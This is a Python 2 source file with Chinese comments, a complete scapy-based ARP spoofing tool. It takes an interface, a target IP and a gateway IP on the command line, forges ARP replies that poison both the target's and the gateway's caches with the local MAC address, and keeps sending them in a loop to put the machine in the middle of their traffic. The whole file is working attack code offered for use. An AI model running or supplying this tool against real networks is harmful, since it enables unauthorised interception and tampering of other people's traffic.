# -*- coding: UTF-8 -*-

from scapy.all import *  # 导入scapy模块
from optparse import OptionParser  # 导入命令行参数处理模块optparse
import sys


def main():
    usage = "Usage: [-i interface] [-t targetip] [-g gatewayip]"
    parser = OptionParser(usage)
    # -i 所选择的网卡，eth0或wlan0，存放在interface变量中
    parser.add_option('-i', dest='interface',
                      help='select interface(input eth0 or wlan0 or more)')
    # -t 要攻击的ip，存放在targetip变量中
    parser.add_option('-t', dest='targetip', help='select ip to spoof')
    # -g 网关ip，存放在gatewayip变量中
    parser.add_option('-g', dest='gatewayip', help='input gateway ip')
    (options, args) = parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface = options.interface
        tip = options.targetip
        gip = options.gatewayip
        spoof(interface, tip, gip)  # 将参数传给spoof函数
    else:
        parser.print_help()  # 显示帮助
        sys.exit(0)


def spoof(interface, tip, gip):  # 获取命令行的输入实现arp攻击
    localmac = get_if_hwaddr(interface)  # get_if_hwaddr获取本地网卡MAC地址
    tmac = getmacbyip(tip)  # 根据目标ip获取其MAC地址
    gmac = getmacbyip(gip)  # 根据网关ip获取其MAC地址
    ptarget = Ether(src=localmac, dst=tmac)/ARP(hwsrc=localmac, psrc=gip,
                                                hwdst=tmac, pdst=tip, op=2)  # 构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
    pgateway = Ether(src=localmac, dst=gmac)/ARP(hwsrc=localmac, psrc=tip,
                                                 hwdst=gmac, pdst=gip, op=2)  # 构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
    try:
        while 1:
            sendp(ptarget, inter=2, iface=interface)
            print "send arp reponse to target(%s),gateway(%s) local mac address is %s" % (
                tip, gip, localmac)
            sendp(pgateway, inter=2, iface=interface)
            print "send arp reponse to gateway(%s),target(%s) local mac address is %s" % (
                gip, tip, localmac)  # 不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == '__main__':
    main()
